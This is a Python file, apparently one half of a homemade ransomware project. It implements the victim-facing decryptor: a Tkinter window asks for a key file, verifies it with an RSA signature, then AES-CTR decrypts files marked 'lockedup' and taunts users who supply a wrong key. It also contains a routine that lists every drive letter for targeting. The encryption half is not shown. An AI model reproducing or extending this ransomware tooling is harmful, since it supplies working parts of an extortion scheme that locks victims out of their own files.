# if tkinter is not installed for python3: $ sudo apt install python3-tk
from tkinter import *
from tkinter import filedialog
import os
import random
from cryptography.hazmat.backends import default_backend
from cryptography.hazmat.primitives.ciphers import (Cipher, algorithms, modes)
import cryptography.exceptions
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.asymmetric import padding
from cryptography.hazmat.primitives.serialization import load_pem_public_key
from base64 import b64decode

class Ransomware():
    def __init__(self):
        self.backend = default_backend()

    def pathFinder(self): 
        allDrives = [chr(x) for x in range(66, 91)]
        availableDrives = []
        for a in allDrives:
            if os.path.exists(a+':\\'):
                availableDrives.append(a+':\\')
        return availableDrives

    def decryptMethod(self, decKey, decNonce, filename):
        self.decKey = b64decode(decKey)
        self.decNonce=b64decode(decNonce)
        self.cipher = Cipher(algorithms.AES(self.decKey), modes.CTR(self.decNonce), backend=self.backend)
        self.filename=filename
        chunksize = 64 * 1024
        outputFile = filename[0:len(filename) - 9]

        with open(filename, 'rb') as infile:
            decryptor = self.cipher.decryptor()
            with open(outputFile, 'wb') as outfile:
                while True:
                    chunk = infile.read(chunksize)
                    if len(chunk) == 0:
                        break

                    outfile.write(decryptor.update(chunk))
        os.remove(filename)

    def decryptAll(self, decKey, decNonce):
        # encpath = self.pathFinder()
        encpath = ['C:\\Users\\10\\Desktop\\My Files\\']
        for _ in encpath:
            for dirPath, dirName, files in os.walk(_):
                for myFile in files:
                    if myFile.endswith('lockedup'):
                        self.decryptMethod(decKey, decNonce, os.path.abspath(os.path.join(dirPath, myFile)))

window = Tk()
window.title("Decrypt Your Files")
window.geometry('300x100')
window.configure(background='#a200bf')
mainLabel = Label(window, text="If you have a decryption key, select it: ", bg='#a200bf')
mainLabel.grid(column=0, row=0)
window.columnconfigure(0, weight=1)
window.rowconfigure(0, weight=1)

def verificationFunc(keyObject):
    
    with open('public.pem', 'rb') as f:
        public_key = load_pem_public_key(f.read(), default_backend())

    with open('signature.sig', 'rb') as f:
        signature = b64decode(f.read())

    verificationFlag = True
    try:
        public_key.verify(
            signature,
            keyObject.encode('utf-8'),
            padding.PSS(
                mgf = padding.MGF1(hashes.SHA256()),
                salt_length = padding.PSS.MAX_LENGTH,
            ),
            hashes.SHA256(),
        )
    except cryptography.exceptions.InvalidSignature:
        verificationFlag = False

    return verificationFlag

def keyVerification():
    filename = filedialog.askopenfilename()
    with open(filename) as f:
        decryptionKeyNonce = f.read()
    if verificationFunc(decryptionKeyNonce):
        decryptionKey, decryptionNonce = decryptionKeyNonce.split('________')
        RanInst=Ransomware()
        RanInst.decryptAll(decryptionKey, decryptionNonce)
        lbl = Label(window, text="Decryption has been started, wait until all of your\n \
            files are decrypted, then close this window.", bg='#a200bf')
        lbl.grid(column=0, row=1)

    else:
        errorLbl = Label(window, text="Wrong decryption key, nice try...", bg='#a200bf')
        errorLbl.grid(column=0, row=1)

btn = Button(window, text="Decryption Key", command=keyVerification, bg='#c3a71f')
btn.grid(column=0, row=3, pady='20px')
window.mainloop()